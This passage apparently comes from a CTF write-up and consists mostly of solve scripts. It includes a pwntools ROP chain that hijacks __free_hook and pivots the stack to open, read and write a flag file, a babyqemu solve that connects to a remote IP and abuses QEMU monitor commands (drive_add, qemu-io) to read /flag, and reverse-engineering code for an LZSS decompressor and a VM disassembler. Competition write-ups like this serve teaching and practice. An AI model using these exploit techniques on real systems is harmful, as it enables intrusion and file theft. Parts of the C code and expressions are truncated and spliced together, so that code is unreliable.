    xor_r10 = 0x0000000000141ee0 +libc_base
    xor_r8 = 0x0000000000049dfd +libc_base
    pop_rax = 0x000000000004a550+libc_base
    syscall = 0x000000000066229+libc_base
    ret = 0x0000000000025679+libc_base
    sh = libc_base+next(libc.search('/bin/sh'),)
    real_rop2= 
p64(pop_rdi)+p64(hook+8)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)+
p64(pop_rdi)+p64(3)+p64(pop_rdx)+p64(0x50)+p64(hook+0x90-8-
0x38)+p64(pop_rax)+p64(lev_ret)+p64(pop_rsi)+p64(hook+0x100)+p64(pop_rax)+p64(
0)+p64(syscall)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(hook+0x100)+p64(pop_rax)+
p64(1)+p64(syscall)
babyqemu
monitor
    real_rop = 
p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(sh)+p64(xor_r10)+p64(xor_r8)+p64(pop_rax)
+p64(322)+p64(ret)+p64(pop_rdx)+p64(0)+p64(hook+0x90-8-
0x38)+p64(syscall)+p64(lev_ret)
    rop = "flag\x00\x00\x00\x00"+p64(hook+32-8)+p64(0)+real_rop2
    print len(p64(stack_pivot)+rop)
    edit_3(10,p64(stack_pivot)+rop) #free_hook
    p.recvuntil('Choice')
    p.sendline('3')
    p.recvuntil('Index')
    p.sendline('10')
    print p.recv()
    #edit_3(3,rop)
    p.interactive()
  except:
    p.close()
    continue
from pwn import *
import fuckpy3
context(os='linux', arch='amd64', log_level='debug')
DEBUG = 0
if DEBUG:
    p = process(argv='./start.sh', raw=False)
else:
    p = remote('149.248.16.204', 8888)
def main():
    ctrl_a = '\x01c'
    p.send(ctrl_a)
    p.sendlineafter('(qemu)', 'stop')
    p.sendlineafter('(qemu)', 'drive_add 0 
file=/flag,id=flag,format=raw,if=none,readonly=on')
    p.sendlineafter('(qemu)', 'qemu-io flag "read -v 0 0x200"')
    p.recvuntil('\r\n')
    data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
    s = b''
    for d in data:
        s += b''.join(d.split()[1:17]).unhex()
    print(s)
    p.interactive()
if __name__ == '__main__':
    main()
Reverse
PicCompress
LZSS
BMP
#include 
#include 
#include 
typedef unsigned char BYTE;
typedef unsigned int DWORD;
size_t decrypt(BYTE* dst, BYTE *src, size_t src_size)
{
    BYTE *buf=(BYTE*)malloc(0x100000);              
    BYTE *cur_src = src;
    BYTE *cur_dst = dst;
    BYTE *end_dst =  cur_dst + *(DWORD*)cur_src;
    DWORD idx_buff, i, last, c1, c2;
    cur_src += 4;
    memset(buf, 0, 0xFEE);
    idx_buff = 0XFEE;
    c1 = 0; //index byte
    while(1)
    {
        c1 >>= 1;
        if (!(c1 & 0x100)) // c1 bit[9] is 0, it means do 8 times
        {
            c1 = *cur_src;
            c1 |= 0xff00; //make a mark, and to 16bit
            cur_src++;
        }
        if ((BYTE)c1 & 0x1) //copy to buf directly
        {
            buf[idx_buff] = *cur_src;
            *cur_dst = *cur_src;
            idx_buff++;
            idx_buff &= 0xFFF; //cicle buffer
            cur_dst++;
            cur_src++;
            if(cur_dst >= end_dst)
            {
                free(buf);
                return (size_t)((BYTE*)end_dst - dst);   
            }
        }
        else
        {
            c2 = *(cur_src+1); //index byte2
            i = *cur_src | ((c2 & 0XF0) end_dst)
            {
                continue;
            }
            do
            {
                buf[idx_buff] = buf[i & 0xFFF];
                *cur_dst = buf[i & 0xFFF];
                idx_buff++;
                idx_buff &= 0xFFF;
                cur_dst++;
                if(cur_dst >= end_dst)
                {
                    free(buf);
                    return (size_t)((BYTE*)end_dst - dst); 
                }
                i++;
            } while (i >0xd)^input)>0xd)^input))
>0xd)^input)
>0xd)^input)
(((((((((input>>0xd)^input)>0xd)^input))
>0xd)^input)
>0xd)^input))>>0x13)^(((((((input>>0xd)^input)
>0xd)^input))
>0xd)^input)
>0xd)^input)==0x26F8D100
while True:
  #print hex(opcode[current])
  if opcode[current]==9:
    print 'mov mem[1],0xffe8bc9a & current+=1'
    current+=1
  if opcode[current]==0x10:
    print 'mov mem[9],mem[1] & current+=1'
    current+=1
  if opcode[current]==0x80:
    print 'mem[0x%x]=0x%x & current+=6'%(opcode[current+1],(opcode[current+4]
>mem[2] & current+=1'
    current+=1
  if opcode[current]==0x77:
    print 'mem[1]=mem[1]^mem[9] & current+=1'
    current+=1
  if opcode[current]==0x23:
    print 'mem[1]=mem[1]<<mem[2] & current+=1'
    current+=1
  if opcode[current]==0x31:
    print 'mem[1]=mem[1]&mem[2] & current+=1'